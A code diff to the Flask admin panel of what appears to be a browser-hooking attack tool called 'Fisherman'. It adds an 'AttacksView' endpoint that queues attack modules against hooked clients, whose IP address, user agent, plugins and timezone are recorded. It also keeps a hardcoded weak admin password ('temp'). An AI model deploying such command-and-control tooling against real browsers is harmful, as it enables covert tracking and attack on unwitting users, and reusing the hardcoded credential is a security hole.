@@ -1,15 +1,16 @@
-from flask_admin.form import Select2Widget
 from flask_admin.contrib.sqla import ModelView
+from flask import abort, json
 from wtforms import SelectField
 from wtforms.validators import InputRequired
-from ..command.models import Command
-from ..armory.parsers import Module
 from flask import request, redirect, url_for
-from flask_admin import AdminIndexView, helpers, expose
+from flask_admin import AdminIndexView, BaseView, helpers, expose
 import flask_login as login
 from wtforms import form, fields, validators
 from werkzeug.security import generate_password_hash, check_password_hash
 from flask_wtf import FlaskForm
+from ..armory.parsers import Module
+from ..command.models import Command
+from ..hook.models import Hook
 
 TEMP_ADMIN_PASSWORD = generate_password_hash("temp")
 
@@ -47,17 +48,39 @@ class FishermanIndexView(AdminIndexView):
         login.logout_user()
         return redirect(url_for('.index'))
 
-
-class CommandForm(FlaskForm):
-    id = SelectField('Command ID', coerce=int, validators=[InputRequired()])
-    module = SelectField('Module', choices=[(module.value, module.name) for module in Module], validators=[InputRequired()])
-
 class CommandAdminView(ModelView):
-    column_list = ('id', 'command')
-    form_columns = ('id', 'command')
+    column_list = ('hook_id', 'command')
+    form_columns = ('hook_id', 'command')
+    column_labels = {'hook_id': 'Hook ID'}
     
+class AttacksView(BaseView):
+    @expose('/')
+    def index(self):
+        return self.render('admin/attacks_index.html') # /api/templates/admin/attacks_index.html (base admin folder)
 
-    
+    @expose('/command')
+    def command_update(self):
+        id = request.args.get('id')
+        module = request.args.get('module')
+
+        if not id or not module:
+            return abort(400)
+
+        if not Module.has_value(module) or id not in [str(id_[0]) for id_ in Hook.query.with_entities(Hook.id).all()]:
+            return abort(400)
+        
+        new_command = Command(
+            hook_id=id,
+            command=module
+        )
+
+        from ..extensions import db
+        db.session.add(new_command)
+        db.session.commit()
+        return json.dumps({'success':True}), 200, {'ContentType':'application/json'} 
+        
+
 class HookAdminView(ModelView):
     column_list = ('id', 'ip_address', 'user_agent', 'screen_resolution', 'browser_plugins', 'language', 'timezone', 'last_update')
+    column_labels = {'id': 'Hook ID'}
     
